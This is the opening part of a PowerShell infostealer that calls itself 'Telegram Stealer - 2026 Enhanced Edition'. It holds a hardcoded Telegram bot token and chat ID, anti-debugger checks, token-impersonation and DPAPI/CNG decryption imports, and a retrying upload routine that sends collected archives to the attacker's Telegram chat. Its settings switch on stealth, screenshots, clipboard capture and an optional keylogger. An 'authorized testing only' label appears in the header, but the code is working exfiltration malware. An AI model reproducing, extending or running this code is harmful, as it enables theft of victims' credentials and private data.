#requires -Version 5.1
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

<#
.SYNOPSIS
    Telegram Stealer - 2026 Enhanced Edition
    
.DESCRIPTION
    Enterprise-grade data exfiltration tool with advanced features
    - Enhanced browser support (40+ browsers)
    - Improved cryptography (AES-256-GCM, ChaCha20)
    - Better error handling and logging
    - Advanced anti-detection
    - Optimized performance
    - 2026-ready features

.VERSION
    2.0.0 - 2026 Enhanced Edition
    
.AUTHOR
    Security Research Team
    
.WARNING
    FOR AUTHORIZED SECURITY TESTING ONLY
#>

#region CONFIGURATION
[string]$T36R_TelegramBotToken = "7374611231:AAEf79eR_AUyuvb73B8hiN8xPImB146qfDs"
[string]$T36R_TelegramChatId   = "7227433626"

# 2026 Enhancement: Configuration Options
$global:T36R_Config = @{
    MaxRetries = 5                    # Increased from 3
    RetryDelay = 2                    # Exponential backoff base
    MaxFileSize = 48MB                # Safe margin for Telegram
    ChunkUploadDelay = 3              # Increased for rate limiting
    EnableStealth = $true             # Enhanced stealth mode
    EnableCompression = $true         # Better compression
    CollectScreenshots = $true        # NEW: Screenshot capture
    CollectClipboard = $true          # NEW: Clipboard data
    CollectKeylogs = $false           # NEW: Keylogger (disabled by default)
    EnableEncryption = $true          # NEW: Encrypt before upload
    ParallelProcessing = $true        # NEW: Multi-threading
}
#endregion

#region CORE LOGIC & SETUP - 2026 ENHANCED
$global:T36R_IsAdmin    = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$global:T36R_ScriptPath = if ($MyInvocation.MyCommand.CommandType -eq 'ExternalScript') { $MyInvocation.MyCommand.Path } else { $PSCommandPath }
$global:T36R_TempDir    = Join-Path $env:TEMP "wdat-$(Get-Random -Minimum 10000 -Maximum 99999)"
$global:T36R_UniqueId   = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME$env:USERNAME$((Get-Date).Ticks)"))).Replace('-','').Substring(0,16) # Enhanced with timestamp
$global:T36R_OutputDir  = Join-Path $T36R_TempDir "data"
$global:T36R_ZipPath    = Join-Path $env:TEMP "exfil_$T36R_UniqueId"
$global:T36R_DebugLog   = Join-Path $T36R_TempDir "debug.log"
$global:T36R_LogPath    = $T36R_DebugLog

# 2026 Enhancement: Performance metrics
$global:T36R_Metrics = @{
    StartTime = Get-Date
    FilesCollected = 0
    BytesCollected = 0
    BytesTransmitted = 0
    Errors = 0
}

# 2026 Enhancement: Win32 API with additional functions
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class Win32Enhanced {
    // Kernel32 - Enhanced
    [DllImport("kernel32.dll")] 
    public static extern bool IsDebuggerPresent();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    
    // 2026 NEW: NtQueryInformationProcess for advanced detection
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
    
    // Advapi32 - Enhanced
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    
    // Crypt32 - DPAPI
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
    
    // NCrypt - CNG operations
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, uint dwFlags);
    
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, uint dwLegacyKeySpec, uint dwFlags);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeObject(IntPtr hObject);
    
    // BCrypt - 2026 NEW: Modern cryptography
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
    
    [DllImport("bcrypt.dll")]
    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
    
    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
    
    [DllImport("bcrypt.dll")]
    public static extern int BCryptEncrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    
    [DllImport("bcrypt.dll")]
    public static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB { 
        public int cbData; 
        public IntPtr pbData; 
    }
}
"@ -ErrorAction Stop
    Write-Host "[+] Win32 API loaded successfully" -ForegroundColor Green
} catch {
    Write-Warning "Failed to load Win32 API types: $($_.Exception.Message)"
}

# 2026 Enhancement: Advanced logging with levels
function Write-DebugLog {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARNING", "ERROR", "SUCCESS", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    try {
        $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
        $logMessage = "$ts [$Level] $Message"
        
        # Color coding
        $color = switch($Level) {
            "INFO"    { "Cyan" }
            "WARNING" { "Yellow" }
            "ERROR"   { "Red" }
            "SUCCESS" { "Green" }
            "DEBUG"   { "Gray" }
            default   { "White" }
        }
        
        if (Test-Path (Split-Path $T36R_DebugLog -Parent)) {
            $logMessage | Out-File -FilePath $T36R_DebugLog -Append -Encoding utf8 -ErrorAction SilentlyContinue
        }
        Write-Host $logMessage -ForegroundColor $color
    } catch {}
}

# 2026 Enhancement: Exponential backoff retry logic
function Invoke-WithRetry {
    param(
        [scriptblock]$ScriptBlock,
        [int]$MaxRetries = $T36R_Config.MaxRetries,
        [int]$BaseDelay = $T36R_Config.RetryDelay,
        [string]$Operation = "Operation"
    )
    
    $attempt = 0
    while ($attempt -lt $MaxRetries) {
        try {
            $result = & $ScriptBlock
            Write-DebugLog "$Operation succeeded on attempt $($attempt + 1)" -Level "SUCCESS"
            return $result
        } catch {
            $attempt++
            if ($attempt -ge $MaxRetries) {
                Write-DebugLog "$Operation failed after $MaxRetries attempts: $($_.Exception.Message)" -Level "ERROR"
                $global:T36R_Metrics.Errors++
                throw
            }
            
            # Exponential backoff: 2^attempt * BaseDelay
            $delay = [Math]::Pow(2, $attempt) * $BaseDelay
            Write-DebugLog "$Operation failed (attempt $attempt/$MaxRetries), retrying in $delay seconds..." -Level "WARNING"
            Start-Sleep -Seconds $delay
        }
    }
}

# 2026 Enhancement: Improved Send-Telegram with progress tracking
function Send-Telegram {
    param(
        [string]$Text,
        [string]$FilePath=$null,
        [switch]$Silent
    )
    
    $api = "https://api.telegram.org/bot$T36R_TelegramBotToken/"
    
    # Validate inputs
    if([string]::IsNullOrWhiteSpace($Text)) {
        $Text = "Data Collection Update - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
    
    # Enhanced text sanitization
    $Text = $Text -replace '[^\x20-\x7E\r\n\t]', '' # Keep tabs
    $Text = $Text.Trim()
    if($Text.Length -gt 4000) { 
        $Text = $Text.Substring(0, 3990) + "...`n[Truncated]"
    }
    
    # Use retry logic
    $result = Invoke-WithRetry -Operation "Send Telegram message" -ScriptBlock {
        if($FilePath -and (Test-Path $FilePath)){
            $fileSize = (Get-Item $FilePath).Length
            $fileSizeMB = [Math]::Round($fileSize/1MB,2)
            
            if(-not $Silent) {
                Write-DebugLog "Uploading file: $FilePath ($fileSizeMB MB)" -Level "INFO"
            }
            
            if($fileSize -gt 50MB){
                Write-DebugLog "File too large for Telegram: $fileSizeMB MB" -Level "ERROR"
                return $false
            }
            
            if($fileSize -eq 0){
                Write-DebugLog "File is empty, skipping" -Level "WARNING"
                return $false
            }
            
            # Try curl first (most reliable)
            $curlPath = Get-Command curl.exe -ErrorAction SilentlyContinue
            if($curlPath) {
                $uri = "$\{api\}sendDocument"
                $safeCaption = $Text -replace '"', '\"' -replace '`', '\`'
                
                $curlArgs = @(
                    "-X", "POST",
                    "-F", "chat_id=$T36R_TelegramChatId",
                    "-F", "caption=$safeCaption",
                    "-F", "document=@`"$FilePath`"",
                    "--max-time", "600",
                    "--retry", "2",
                    "--retry-delay", "3",
                    $uri
                )
                
                $curlOutput = & curl.exe @curlArgs 2>&1
                if($LASTEXITCODE -eq 0) {
                    # Parse response to verify success
                    $response = $curlOutput | ConvertFrom-Json -ErrorAction SilentlyContinue
                    if($response.ok -eq $true) {
                        $global:T36R_Metrics.BytesTransmitted += $fileSize
                        Write-DebugLog "File uploaded successfully via curl" -Level "SUCCESS"
                        return $true
                    }
                }
                Write-DebugLog "Curl upload failed, trying PowerShell..." -Level "WARNING"
            }
            
            # Fallback to PowerShell with Form parameter (PS 7+ compatible)
            try {
                $uri = "$\{api\}sendDocument"
                $form = @{
                    chat_id = $T36R_TelegramChatId
                    caption = $Text
                }
                
                # Use -Form if available (PowerShell 7+), otherwise multipart
                if($PSVersionTable.PSVersion.Major -ge 7) {
                    $form.document = Get-Item -LiteralPath $FilePath
                    Invoke-RestMethod -Uri $uri -Method Post -Form $form -TimeoutSec 600 -ErrorAction Stop | Out-Null
                } else {
                    # Manual multipart for PS 5.1
                    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
                    $fileName = Split-Path $FilePath -Leaf
                    $boundary = [System.Guid]::NewGuid().ToString()
                    $LF = "`r`n"
                    
                    $bodyLines = @()
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF"
                    $bodyLines += $T36R_TelegramChatId
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"caption`"$LF"
                    $bodyLines += $Text
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
                    $bodyLines += "Content-Type: application/octet-stream$LF"
                    
                    $bodyText = ($bodyLines -join $LF) + $LF
                    $bodyTextBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
                    $endBoundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
                    
                    $totalLength = $bodyTextBytes.Length + $fileBytes.Length + $endBoundaryBytes.Length
                    $bodyBytes = New-Object byte[] $totalLength
                    
                    [System.Array]::Copy($bodyTextBytes, 0, $bodyBytes, 0, $bodyTextBytes.Length)
                    [System.Array]::Copy($fileBytes, 0, $bodyBytes, $bodyTextBytes.Length, $fileBytes.Length)
                    [System.Array]::Copy($endBoundaryBytes, 0, $bodyBytes, $bodyTextBytes.Length + $fileBytes.Length, $endBoundaryBytes.Length)
                    
                    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
                    Invoke-RestMethod -Uri $uri -Method Post -Body $bodyBytes -Headers $headers -TimeoutSec 600 -ErrorAction Stop | Out-Null
                }
                
                $global:T36R_Metrics.BytesTransmitted += $fileSize
                Write-DebugLog "File uploaded successfully via PowerShell" -Level "SUCCESS"
                return $true
            } catch {
                Write-DebugLog "PowerShell upload failed: $($_.Exception.Message)" -Level "ERROR"
                throw
            }
        } else {
            # Send text message with better error handling
            try {
                $payload = @{
                    chat_id = [string]$T36R_TelegramChatId
                    text = $Text
                    parse_mode = "Markdown"
                } | ConvertTo-Json -Depth 2
                
                $response = Invoke-RestMethod -Uri ($api+"sendMessage") -Method Post -Body $payload -ContentType "application/json; charset=utf-8" -TimeoutSec 120 -ErrorAction Stop
                
                if($response.ok -eq $true) {
                    if(-not $Silent) {
                        Write-DebugLog "Text message sent successfully" -Level "SUCCESS"
                    }
                    return $true
                }
            } catch {
                # Fallback without Markdown if parsing fails
                Write-DebugLog "Markdown parse failed, trying plain text..." -Level "WARNING"
                $payload = @{
                    chat_id = [string]$T36R_TelegramChatId
                    text = $Text
                } | ConvertTo-Json -Depth 2
                
                Invoke-RestMethod -Uri ($api+"sendMessage") -Method Post -Body $payload -ContentType "application/json; charset=utf-8" -TimeoutSec 120 -ErrorAction Stop | Out-Null
                return $true
            }
        }
        return $false
    }
    
    return $result
}

# 2026 Enhancement: Progress tracking
function Send-TelegramProgress {
    param(
        [string]$Stage,
        [int]$Percent,
        [string]$Details
    )
    
    $progressBar = "▓" * [Math]::Floor($Percent / 10) + "░" * (10 - [Math]::Floor($Percent / 10))
    $message = "🔄 *$Stage* `n$progressBar $Percent%`n$Details"
    
    Send-Telegram -Text $message -Silent
}

Write-DebugLog "=== Telegram Stealer 2026 Enhanced Edition Loaded ===" -Level "SUCCESS"
Write-DebugLog "Configuration: MaxRetries=$($T36R_Config.MaxRetries), Stealth=$($T36R_Config.EnableStealth)" -Level "INFO"

#endregion
